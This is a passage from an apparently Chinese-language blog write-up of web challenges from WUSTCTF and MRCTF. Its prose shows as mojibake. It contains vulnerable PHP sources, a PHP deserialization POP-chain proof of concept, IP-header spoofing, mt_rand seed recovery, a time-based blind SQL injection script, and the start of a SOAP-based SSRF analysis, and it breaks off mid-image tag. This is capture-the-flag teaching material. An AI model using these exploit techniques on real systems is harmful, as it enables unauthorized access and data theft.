class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">'takeip.php'</span>;</span><br><span class="line">ini_set(<span class="string">'open_basedir'</span>,<span class="string">'.'</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'Merak'</span>]))&#123; </span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line">    <span class="keyword">die</span>(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span><span class="params">($v)</span></span>&#123; </span><br><span class="line">    $v = base64_decode($v); </span><br><span class="line">    $re = <span class="string">''</span>; </span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($v);$i++)&#123; </span><br><span class="line">        $re .= chr ( ord ($v[$i]) + $i*<span class="number">2</span> ); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> $re; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Local access only!'</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">$ip = getIp();</span><br><span class="line"><span class="keyword">if</span>($ip!=<span class="string">'127.0.0.1'</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Sorry,you don't have permission!  Your ip is :"</span>.$ip;</span><br><span class="line"><span class="keyword">if</span>($ip === <span class="string">'127.0.0.1'</span> &amp;&amp; file_get_contents($_GET[<span class="string">'2333'</span>]) === <span class="string">'todat is a happy day'</span> )&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Your REQUEST is:"</span>.change($_GET[<span class="string">'file'</span>]);</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(change($_GET[<span class="string">'file'</span>])); &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ¥ç€è€å¥—å¨ƒäº†ã€‚<br>é¦–å…ˆæ˜¯<code>getIp()</code>å‡½æ•°ï¼Œå»å®˜ç½‘æŸ¥äº†ä¸‹ï¼Œæ˜¯headerå¯æ§ã€‚é‚£å°±headerè®¾ç½®ä¸º<code>Client-IP:127.0.0.1</code><br>ç„¶åä¸ºäº†<code>file_get_contents($_GET[&#39;2333&#39;]) === &#39;todat is a happy day&#39;</code>è¿™æ­¥è€æ–¹æ³•ä½¿ç”¨dataåè®®<br><code>data://text/plain,todat is a happy day</code><br>æœ€åä¸€ä¸ªfileå…ˆç”¨ä¸Šé¢ç»™çš„å‡½æ•°æ”¹æ”¹ç¼–ç ä¸‹å³å¯ã€‚</p><h2 id="Ezpop"><a href="#Ezpop" class="headerlink" title="Ezpop"></a>Ezpop</h2><p>popé“¾æ„é€ ,å®è¯è¯´ä¸‰ä¸ªç±»çš„popå¾ˆåŸºç¡€ï¼Œä¸è¿‡æˆ‘å¼€å§‹è§‰å¾—è¿™ä¸ªèµ·ç‚¹è´¼è¯¡å¼‚ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="comment">//WTF IS THIS?</span></span><br><span class="line"><span class="comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span></span><br><span class="line"><span class="comment">//And Crack It!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  $var;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span><span class="params">($value)</span></span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file=<span class="string">'index.php'</span>)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Welcome to '</span>.<span class="keyword">$this</span>-&gt;source.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/gopher|http|file|ftp|https|dict|\.\./i"</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"hacker"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">"index.php"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span>&#123;</span><br><span class="line">        $function = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'pop'</span>]))&#123;</span><br><span class="line">    @unserialize($_GET[<span class="string">'pop'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    $a=<span class="keyword">new</span> Show;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç›®æ ‡è‡ªç„¶æ˜¯include flag.phpäº†ã€‚ä¸è¿‡æœ€å¥½ç›´æ¥ä¼ªåè®®è¯»ã€‚</p><p>é¦–å…ˆè¦è§¦å‘<code>__toString</code>é‚£å°±å…ˆæ¥ä¸ªechoã€‚ä¹Ÿå°±æ˜¯è¯´è¿˜å¾—å†æ¥ä¸ªShowç±»å¯¹è±¡ç½®ä¸ºå®ƒçš„sourceå±æ€§,echoæ—¶è§¦å‘.Showç±»å¸¦Showç±»,è®²ç©¶ã€‚</p><p>ä¹‹å<code>$this-&gt;str-&gt;source</code>æ˜æ˜¾å¯ä»¥è§¦å‘Testçš„<code>__get()</code>ï¼Œç„¶åè¿”å›å€¼æ˜¯å‡½æ•°ï¼Œé‚£å°±å¯ä»¥è§¦å‘Modiferçš„<code>__invoke()</code>äº†ã€‚</p><p>å¾ˆç®€å•çš„é“¾å­ï¼Œå°±æ˜¯ç¬¬ä¸€æ­¥è‡ªå·±å¼€å§‹çŠ¯å‚»ä»¥ä¸º__toString()è§¦å‘æ˜¯echoæ—¶è‡ªåŠ¨å°±æœ‰çš„ï¼Œæƒ³äº†åŠå¤©ç¡®è®¤åº”è¯¥è¿˜æ˜¯å¾—å¯¹è±¡echoæ‰ä¼šè§¦å‘ã€‚è¿™ç‚¹ä¸èƒ½æ··æ·†ã€‚<br>poc:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  $var=<span class="string">"php://filter/read=convert.base64-encode/resource=flag.php"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a=<span class="keyword">new</span> Show();</span><br><span class="line">$b=<span class="keyword">new</span> Show();</span><br><span class="line">$a-&gt;source=$b;</span><br><span class="line">$b-&gt;str=<span class="keyword">new</span> Test();</span><br><span class="line">$b-&gt;str-&gt;p=<span class="keyword">new</span> Modifier();</span><br><span class="line"><span class="keyword">echo</span>(urlencode(serialize($a)));</span><br></pre></td></tr></table></figure><h2 id="Ezaudit"><a href="#Ezaudit" class="headerlink" title="Ezaudit"></a>Ezaudit</h2><p>æç¤ºaudité‚£å°±çœ‹çœ‹æºç æ³„éœ²ã€‚å‘ç°<a href="http://www.zipï¼Œç»“æœä¸Šæ¥å°±åªæœ‰ä¸€ä¸ªindex.php,è¿˜ä»¥ä¸ºæœ‰å¾ˆå¤šæºç " target="_blank" rel="noopener">www.zipï¼Œç»“æœä¸Šæ¥å°±åªæœ‰ä¸€ä¸ªindex.php,è¿˜ä»¥ä¸ºæœ‰å¾ˆå¤šæºç </a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">header(<span class="string">'Content-type:text/html; charset=utf-8'</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'login'</span>]))&#123;</span><br><span class="line">    $username = $_POST[<span class="string">'username'</span>];</span><br><span class="line">    $password = $_POST[<span class="string">'password'</span>];</span><br><span class="line">    $Private_key = $_POST[<span class="string">'Private_key'</span>];</span><br><span class="line">    <span class="keyword">if</span> (($username == <span class="string">''</span>) || ($password == <span class="string">''</span>) ||($Private_key == <span class="string">''</span>)) &#123;</span><br><span class="line">        <span class="comment">// è‹¥ä¸ºç©º,è§†ä¸ºæœªå¡«å†™,æç¤ºé”™è¯¯,å¹¶3ç§’åè¿”å›ç™»å½•ç•Œé¢</span></span><br><span class="line">        header(<span class="string">'refresh:2; url=login.html'</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"ç”¨æˆ·åã€å¯†ç ã€å¯†é’¥ä¸èƒ½ä¸ºç©ºå•¦,crisprä¼šè®©ä½ åœ¨2ç§’åè·³è½¬åˆ°ç™»å½•ç•Œé¢çš„!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>($Private_key != <span class="string">'*************'</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        header(<span class="string">'refresh:2; url=login.html'</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"å‡å¯†é’¥ï¼Œå’‹ä¼šè®©ä½ ç™»å½•?crisprä¼šè®©ä½ åœ¨2ç§’åè·³è½¬åˆ°ç™»å½•ç•Œé¢çš„!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>($Private_key === <span class="string">'************'</span>)&#123;</span><br><span class="line">        $getuser = <span class="string">"SELECT flag FROM user WHERE username= 'crispr' AND password = '$password'"</span>.<span class="string">';'</span>; </span><br><span class="line">        $link=mysql_connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>);</span><br><span class="line">        mysql_select_db(<span class="string">"test"</span>,$link);</span><br><span class="line">        $result = mysql_query($getuser);</span><br><span class="line">        <span class="keyword">while</span>($row=mysql_fetch_assoc($result))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;tr&gt;&lt;td&gt;"</span>.$row[<span class="string">"username"</span>].<span class="string">"&lt;/td&gt;&lt;td&gt;"</span>.$row[<span class="string">"flag"</span>].<span class="string">"&lt;/td&gt;&lt;td&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">// genarate public_key </span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">public_key</span><span class="params">($length = <span class="number">16</span>)</span> </span>&#123;</span><br><span class="line">    $strings1 = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>;</span><br><span class="line">    $public_key = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">    $public_key .= substr($strings1, mt_rand(<span class="number">0</span>, strlen($strings1) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $public_key;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//genarate private_key</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">private_key</span><span class="params">($length = <span class="number">12</span>)</span> </span>&#123;</span><br><span class="line">    $strings2 = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>;</span><br><span class="line">    $private_key = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">    $private_key .= substr($strings2, mt_rand(<span class="number">0</span>, strlen($strings2) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $private_key;</span><br><span class="line">  &#125;</span><br><span class="line">  $Public_key = public_key();</span><br><span class="line">  <span class="comment">//$Public_key = KVQP0LdJKRaV3n9D  how to get crispr's private_key???</span></span><br></pre></td></tr></table></figure><p>åªè¦ç»•è¿‡ä¸€ä¸ªç§é’¥å³å¯sqlæ³¨å…¥ã€‚<br>é‚£ä¹ˆæ³¨æ„åˆ°å…¬,ç§é’¥æ˜¯é€šè¿‡mt_rand()ç”Ÿæˆçš„ï¼Œé‚£å°±å¥½è¯´ã€‚ç›´æ¥./mt_rèµ°èµ·<br>å…ˆå°†å…¬é’¥è½¬ä¸ºè„šæœ¬å¯è¯†åˆ«çš„æ•°æ®</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">str1=<span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span></span><br><span class="line">str2=<span class="string">'KVQP0LdJKRaV3n9D'</span></span><br><span class="line">str3 = str1[::<span class="number">-1</span>]</span><br><span class="line">length = len(str2)</span><br><span class="line">res=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(str2)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(len(str1)):</span><br><span class="line">        <span class="keyword">if</span> str2[i] == str1[j]:</span><br><span class="line">            res+=str(j)+<span class="string">' '</span>+str(j)+<span class="string">' '</span>+<span class="string">'0'</span>+<span class="string">' '</span>+str(len(str1)<span class="number">-1</span>)+<span class="string">' '</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure><p>ç„¶åè®¾å®šå¥½éšæœºæ•°ç§å­ï¼ŒæŒ‰å…ˆå…¬é’¥,å†ç§é’¥çš„é¡ºåºç”Ÿæˆã€‚å¾—åˆ°ç§é’¥<code>XuNhoueCDCGc</code><br>ç›´æ¥sqlæ³¨å…¥å³å¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">'http://aa90a604-c5bb-44d9-8589-b9614155f505.merak-ctf.site/login.php'</span></span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    print(i)</span><br><span class="line">    <span class="keyword">for</span> str1 <span class="keyword">in</span> <span class="string">"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_,!@#$%^&amp;*``.&#123;&#125;-"</span>:</span><br><span class="line">        payload = <span class="string">"1' or if(ascii(substr(flag,"</span>+str(i)+<span class="string">",1))="</span>+str(ord(str1))+<span class="string">",sleep(3),1)#"</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'username'</span>: <span class="string">'admin'</span>,</span><br><span class="line">            <span class="string">'password'</span>: payload,</span><br><span class="line">            <span class="string">'Private_key'</span>: <span class="string">'XuNhoueCDCGc'</span>,</span><br><span class="line">            <span class="string">'login'</span>: <span class="string">'1'</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(url, data=data,timeout=<span class="number">3</span>)</span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.ReadTimeout:</span><br><span class="line">            flag += str1</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>æ‰“å¼€kali+çˆ†ç ´ç§å­èŠ±äº†10å¤šåˆ†é’Ÿï¼Œå‰å‡ è¡€åˆæ²¡äº†ã€‚å¿ƒé‡Œè‹¦ã€‚<br>äº‹åä»”ç»†ä¸€çœ‹sqlè¯­å¥å·²ç»å†™å¥½äº†ï¼Œæ‰€ä»¥åªè¦ä¸‡èƒ½å¯†ç å°±è¡Œäº†ã€‚éš¾æ€ªæ‰‹é€Ÿæ…¢ï¼Œè¯¥æ‰“ã€‚</p><h2 id="Ezpop-revenge"><a href="#Ezpop-revenge" class="headerlink" title="Ezpop_revenge"></a>Ezpop_revenge</h2><p>æ‰“ç®—å†™wpå°±æ˜¯ä¸ºäº†è¿™é¢˜ã€‚è´¨é‡ç»å¯¹å¤Ÿã€‚<br>å¼€å§‹ä¸‹è½½<a href="http://www.zipçš„æºç ,ç„¶åå‘ç°æ˜¯typeEchoçš„æ¨¡æ¿ï¼Œä¹‹å‰æ²¡å®¡è¿‡è¿™ä¸ªæ¨¡æ¿ç›¸å…³çš„popé“¾,ä¸Šå»æ‰¾äº†ä¸‹è¿˜æŒºæœ‰æ„æ€ã€‚" target="_blank" rel="noopener">www.zipçš„æºç ,ç„¶åå‘ç°æ˜¯typeEchoçš„æ¨¡æ¿ï¼Œä¹‹å‰æ²¡å®¡è¿‡è¿™ä¸ªæ¨¡æ¿ç›¸å…³çš„popé“¾,ä¸Šå»æ‰¾äº†ä¸‹è¿˜æŒºæœ‰æ„æ€ã€‚</a><br>è·Ÿzjyå¸ˆå‚…å®¡å‡ºäº†å…¥å£+åˆ©ç”¨ç‚¹å°±æ‡’å¾—å†™pocäº†ã€‚ä¸è¿‡è¿˜æ˜¯å¾—åŠ¨æ‰‹åšåšæ‰è¡Œã€‚ï¼ˆæ¯•ç«Ÿå®é™…å†™èµ·æ¥å¤šåŠç›´æ¥æ‹‰èƒ¯ï¼‰</p><p>é¦–å…ˆæ˜¯ç»ˆç»“ç‚¹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION)) session_start();</span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">'REMOTE_ADDR'</span>]===<span class="string">"127.0.0.1"</span>)&#123;</span><br><span class="line">   $_SESSION[<span class="string">'flag'</span>]= <span class="string">"MRCTF&#123;******&#125;"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">"æˆ‘æ‰Œyour problem?\n</span></span><br><span class="line"><span class="string">only localhost can get flag!"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ˜¾ç„¶æ˜¯è¦ssrfã€‚è€Œä¸”è¿™é‡Œè®©æˆ‘è«åæƒ³åˆ°äº†ä¹‹å‰LCTFçš„bestphpâ€™srevenge.å°±æ˜¯é€šè¿‡Soapæ‰“ssrfçš„ä¸€ä¸ªtrick.<br>ç„¶åæ‰¾å…¥å£äº†ã€‚<br>è¿™é‡Œéš¾å—çš„æ˜¯phpstormå…¨å±€æœç´¢æ‰¾ä¸åˆ°unserializeã€‚è¿˜æ˜¯zjyå¸ˆå‚…å¸®æˆ‘æ‰¾åˆ°çš„.åŸæ¥æ˜¯æ’ä»¶é‡Œé¢æ‰‹å†™çš„ä¸€ä¸ªç±»<br>ä¸»ä½“å‡½æ•°å¤§æ¦‚è¿™ä¹ˆå¤š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloWorld_DB</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $flag=<span class="string">"MRCTF&#123;this_is_a_fake_flag&#125;"</span>;</span><br><span class="line">    <span class="keyword">private</span> $coincidence;</span><br><span class="line">    <span class="function"><span class="keyword">function</span>  <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $db = <span class="keyword">new</span> Typecho_Db(<span class="keyword">$this</span>-&gt;coincidence[<span class="string">'hello'</span>], <span class="keyword">$this</span>-&gt;coincidence[<span class="string">'world'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">action</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION)) session_start();</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">'admin'</span>])) var_dump($_SESSION);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'C0incid3nc3'</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span>(preg_match(<span class="string">"/file|assert|eval|[`\'~^?&lt;&gt;$%]+/i"</span>,base64_decode($_POST[<span class="string">'C0incid3nc3'</span>])) === <span class="number">0</span>)</span><br><span class="line">                unserialize(base64_decode($_POST[<span class="string">'C0incid3nc3'</span>]));</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"Not that easy."</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>æ³¨æ„åˆ°wakeupåè‡ªç„¶æ˜ç™½ååºåˆ—åŒ–çš„è§¦å‘æ–¹å¼äº†.åŒæ—¶æŒ‰ç…§LCTFçš„ç»éªŒï¼Œè¿™é‡Œå¤§æ¦‚ç‡æ˜¯ä¸€ä¸ªä¸€ä¸ªåŒå‚æ•°å‡½æ•°ï¼Œå³<code>call_user_func</code>+Soapæ‰“ssrfã€‚<br>è·Ÿä¸€ä¸‹Typecho_Dbç±»<br><img src="/2020/03/29/WUSTCTF&MRCTF%E9%83%A8%E5%88%86web%E9%A2%98%E8%A7%A3/5.PNG" class="lazyload" data-srcset="5.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" 